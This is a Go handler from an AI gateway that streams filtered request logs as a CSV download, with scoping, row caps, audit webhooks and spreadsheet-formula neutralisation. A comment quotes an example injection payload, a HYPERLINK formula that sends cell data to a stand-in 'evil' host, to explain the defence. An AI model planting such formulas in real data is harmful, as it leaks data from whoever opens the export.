package handler

// GET /api/logs/export — CSV download of exactly the filtered log set.
//
// Complements /api/billing/export (kept unchanged for compatibility): this
// endpoint reuses the shared log filter builder, so "export what I'm looking
// at" works — filters from the Logs UI serialize straight into the query
// string. Streams row-by-row to keep memory flat; hard-capped with an
// X-Truncated header so huge filters can't OOM the server or the browser.

import (
	"database/sql"
	"fmt"
	"net/http"
	"strings"
	"time"

	"ai-gateway/internal/auth"
	"ai-gateway/internal/db"

	"ai-gateway/internal/httperr"
	"ai-gateway/internal/webhook"
	"github.com/rs/zerolog/log"
)

// logsExportMaxRows caps a single CSV download. Beyond this the export is
// truncated (flagged via X-Truncated: true) — narrower filters or the
// billing export should be used instead.
const logsExportMaxRows = 50000

func (h *AdminHandler) LogsExport(w http.ResponseWriter, r *http.Request) {
	// Own-key-scoped callers bypass the org requirement: their export is
	// already bounded to keys they created (logScopeOwnOnly).
	orgID := ""
	if hasAll, _, _ := logScopeOwnOnly(r, h, "rl"); hasAll {
		var ok bool
		if orgID, ok = h.resolveScope(r); !ok {
			httperr.Forbidden(w, "org scope required")
			return
		}
	}
	if webhook.Global != nil {
		webhook.Global.Emit("logs.export", map[string]any{
			"actor":  auth.GetSubject(r),
			"action": "export",
			"filter": r.URL.RawQuery,
			"path":   r.URL.Path,
			"time":   time.Now().UTC().Format(time.RFC3339Nano),
		})
	}

	whereSQL, args := logFilterWhere(orgID, r.URL.Query())
	// Ownership narrowing for keys:read_own-only callers.
	_, scopeSQL, scopeArgs := logScopeOwnOnly(r, h, "rl")
	if scopeSQL != "" {
		sep := " WHERE "
		if strings.Contains(whereSQL, "WHERE") {
			sep = " AND "
		}
		whereSQL += sep + scopeSQL
		args = append(args, scopeArgs...)
	}
	from := " FROM request_logs rl LEFT JOIN providers p ON rl.provider_id = p.id" + whereSQL

	rows, err := h.DB.Query(db.Q(`SELECT rl.id, rl.key_prefix, COALESCE(rl.key_id,''), rl.provider_id, rl.model, rl.endpoint, rl.status, rl.latency_ms, COALESCE(rl.ttft_ms,0), rl.created_at, rl.prompt_tokens, rl.completion_tokens, rl.total_tokens, rl.cost_usd, rl.is_stream, COALESCE(rl.finish_reason,''), COALESCE(rl.error,'')`+from+logOrderClause(r.URL.Query())+` LIMIT ?`),
		append(args, logsExportMaxRows+1)...) // +1 to detect truncation
	if err != nil {
		http.Error(w, `{"error":"query failed"}`, http.StatusInternalServerError)
		return
	}
	// Materialise the bounded result, THEN close the cursor and write.
	//
	// Streaming inside rows.Next() held the process's only SQLite connection
	// (db.go SetMaxOpenConns(1)) for as long as the client took to read, with
	// WriteTimeout deliberately 0: a throttled client stalled /ready and every
	// /v1 auth+usage write behind it (measured: /api/logs timed out at 15 s,
	// /ready at 5 s). The row cap makes this a few MB at most.
	lines := make([]string, 0, 256)
	truncated := false
	skipped := 0
	for rows.Next() {
		if len(lines) >= logsExportMaxRows {
			truncated = true
			break
		}
		var id, keyPrefix, model, endpoint, finishReason string
		var keyID, providerID, errMsg sql.NullString
		var createdAt sql.NullTime
		var status int
		var latencyMs, ttftMs int64
		var promptTokens, completionTokens, totalTokens int
		var costUSD float64
		var isStream bool
		if err := rows.Scan(&id, &keyPrefix, &keyID, &providerID, &model, &endpoint, &status, &latencyMs, &ttftMs, &createdAt, &promptTokens, &completionTokens, &totalTokens, &costUSD, &isStream, &finishReason, &errMsg); err != nil {
			skipped++
			continue
		}
		ts := ""
		if createdAt.Valid {
			ts = createdAt.Time.UTC().Format(time.RFC3339)
		}
		stream := "0"
		if isStream {
			stream = "1"
		}
		lines = append(lines, fmt.Sprintf("%s,%s,%s,%s,%s,%s,%d,%d,%d,%s,%d,%d,%d,%.6f,%s,%s,%s\n",
			csvQuote(id), csvQuote(keyPrefix), csvQuote(keyID.String), csvQuote(providerID.String), csvQuote(model), csvQuote(endpoint),
			status, latencyMs, ttftMs, ts, promptTokens, completionTokens, totalTokens, costUSD,
			stream, csvQuote(finishReason), csvQuote(errMsg.String)))
	}
	if rerr := rows.Err(); rerr != nil {
		rows.Close()
		log.Warn().Err(rerr).Msg("logs export: row iteration failed")
		http.Error(w, `{"error":"query failed"}`, http.StatusInternalServerError)
		return
	}
	rows.Close()

	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="logs-%s.csv"`, time.Now().UTC().Format("20060102-150405")))
	// Truncation is decided BEFORE the headers go out, so the signal is actually
	// transmitted (it used to be set after WriteHeader, which can never work).
	if truncated {
		w.Header().Set("X-Truncated", "true")
	}
	// A dead peer must not pin this goroutine after the DB work is done.
	_ = http.NewResponseController(w).SetWriteDeadline(time.Now().Add(60 * time.Second))
	w.WriteHeader(http.StatusOK)

	// RFC 4180 quoting plus spreadsheet formula neutralisation (csvQuote).
	w.Write([]byte("id,key_prefix,key_id,provider_id,model,endpoint,status,latency_ms,ttft_ms,created_at,prompt_tokens,completion_tokens,total_tokens,cost_usd,is_stream,finish_reason,error\n"))
	for _, line := range lines {
		if _, werr := w.Write([]byte(line)); werr != nil {
			return
		}
	}
	if truncated {
		// In-band too: some proxies strip custom response headers.
		fmt.Fprintf(w, "# truncated at %d rows — narrow the filters\n", logsExportMaxRows)
	}
	if skipped > 0 {
		fmt.Fprintf(w, "# %d rows skipped (scan error)\n", skipped)
	}
}

// csvSafe neutralises spreadsheet formula injection before RFC 4180 quoting.
//
// model, endpoint, error and key_prefix are all attacker-influenced (model and
// endpoint come straight from the client request body; error is upstream text).
// Excel and LibreOffice execute a cell that begins with = + - @ or a tab/CR, so
// a client that sends `{"model":"=HYPERLINK(\"http://evil/\"&A1,\"x\")"}` gets
// its formula evaluated with the privileges of the operator who opens the
// billing export. Prefixing with an apostrophe makes the cell text.
func csvSafe(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + s
	}
	return s
}

// csvQuote applies csvSafe and then RFC 4180 quoting.
func csvQuote(s string) string {
	s = csvSafe(s)
	if strings.ContainsAny(s, ",\"\n\r") {
		return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
	}
	return s
}
